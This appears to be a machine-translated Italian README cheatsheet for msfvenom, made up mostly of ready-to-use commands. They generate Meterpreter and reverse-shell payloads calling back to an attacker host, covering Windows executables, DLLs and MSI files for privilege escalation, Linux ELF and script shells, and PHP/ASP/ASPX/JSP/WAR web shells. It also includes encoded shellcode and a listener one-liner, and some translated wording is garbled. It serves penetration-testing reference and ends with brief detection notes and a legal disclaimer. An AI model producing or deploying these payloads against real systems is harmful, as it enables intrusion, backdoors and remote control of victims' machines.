<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<palign="centro">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formati">
</p>

<palign="centro">
  <b>💣 Cheatsheet principale per la generazione di payload autonomi, shellcode e backdoor su piattaforme Windows, Linux, macOS, Android e Web</b>
</p>

---

## 📋 Sommario

- [Panoramica e architettura del carico utile](#-panoramica--architettura-del carico utile)
  - [Payload graduali e senza fasi](#payload-stage-vs-stageless)
- [Flag e opzioni essenziali](#-essential-flags--opzioni)
- [Carichi utili di Windows (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Payload Linux e Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Payload Web e Web Shell (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Generazione di shellcode per lo sviluppo di exploit (C, Raw, Python)](#-shellcode- generation-for-exploit-development-c-raw-python)
  - [Eliminazione dei personaggi inappropriati (`-b`)](#eliminazione-dei-caratteri-inappropriati--b)
  - [Codificatori e iterazioni multiple (`-e`, `-i`)](#encoder--iterazioni-multiple--e--i)
- [Configurazione rapida di Metasploit Multi-Handler](#-metasploit-multi-handler-quick-setup)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rilevamento](#-considerazioni-difensive--rilevamento)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e architettura del carico utile

Combinando le classiche utilità `msfpayload` e `msfencode`, **msfvenom** genera eseguibili binari, script e codice shell non elaborato per test di sfruttamento e penetrazione.

### Carichi utili a fasi e senza fasi
- **In scena (ad esempio `windows/x64/meterpreter/reverse_tcp`):**
  Utilizza le barre tra i componenti. Un piccolo stub (fase 0) si ricollega all'ascoltatore e recupera l'intera DLL riflettente (fase 1) in memoria. Ideale per exploit con limiti rigorosi di lunghezza del buffer.
- **Senza palco (ad esempio `windows/x64/meterpreter_reverse_tcp`):**
  Utilizza un carattere di sottolineatura (`_`). L'intero payload di Meterpreter è autonomo all'interno dell'eseguibile o dello shellcode. Funziona in modo affidabile senza fare affidamento su handshake di rete a più fasi, rendendolo ideale per i corridori della riga di comando e la persistenza evasiva.

---

## ⚙️ Bandiere e opzioni essenziali
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Bandiera | Descrizione |
|------|-------------|
| `-p, --payload` | Specifica il payload da utilizzare (`--list payloads` per visualizzare tutto). |
| `-f, --format` | Formato di output (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Codificatore Shellcode per eliminare i caratteri errati (`--list encoders`). |
| `-i, --iterations` | Numero di passaggi di codifica. |
| `-b, --bad-chars` | Caratteri da evitare nello shellcode (ad esempio, `\x00\x0a\x0d`). |
| `-x, --template` | Modello eseguibile in cui inserire il payload. |
| `-k, --keep` | Conserva la normale esecuzione del modello in un nuovo thread. |
| `-o, --out` | Percorso del file di destinazione dell'output. |

---

## 🪟 Payload di Windows (EXE, DLL, MSI, PowerShell)

### Eseguibile della shell inversa di Windows x64 (senza fasi)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Eseguibile TCP inverso con stage per Windows x64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Payload di inserimento DLL di Windows
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Programma di installazione MSI di Windows (escalation dei privilegi tramite AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Comando PowerShell codificato Base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Payload Linux e Unix (ELF, Python, Bash)

### Linux x64 ELF Binario (senza fasi)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Standard Linux `/bin/sh` TCP inverso (nessun meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Script di shell inversa Python autonomo
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Stringa di comando Bash pura
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Payload Web e Web Shell (PHP, ASP, ASPX, JSP, WAR)

### Shell per il metroprete inverso PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### ASP classico e ASPX (server IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Pacchetto Java WAR (archivio Web Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Generazione di shellcode per lo sviluppo di exploit (C, Raw, Python)

### Eliminazione di personaggi errati (`-b`)
Byte null (`\x00`), ritorni a capo (`\r` = `\x0d`) e ritorni a capo (`\n` = `\x0a`) interrompono gli exploit di corruzione della memoria basati su stringhe (ad esempio, stack overflow):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Codificatori e iterazioni multiple (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Configurazione rapida multi-handler Metasploit

Cattura sempre i payload utilizzando `multi/handler` di Metasploit:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Tabella di consultazione rapida

| Piattaforma di destinazione | Comando |
|-----------------|---------|
| **Windows x64EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Tomcat GUERRA** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Shellcode grezzo (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Considerazioni difensive e rilevamento

1. **Rilevamento della firma statica:** i modelli e i codificatori Msfvenom predefiniti (`shikata_ga_nai`) hanno firme statiche note identificate praticamente da tutti i moderni motori antivirus.
2. **Monitoraggio EDR comportamentale:** gli agenti EDR segnalano la generazione anomala di processi (ad esempio `cmd.exe` o `powershell.exe` generati sotto `w3wp.exe` o `tomcat8.exe`).

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Msfvenom genera payload offensivi funzionali e backdoor. Deve essere rigorosamente utilizzato durante i test di penetrazione autorizzati e all'interno di ambienti di ricerca di laboratorio isolati. La generazione o l'esecuzione non autorizzata su computer di terze parti è illegale.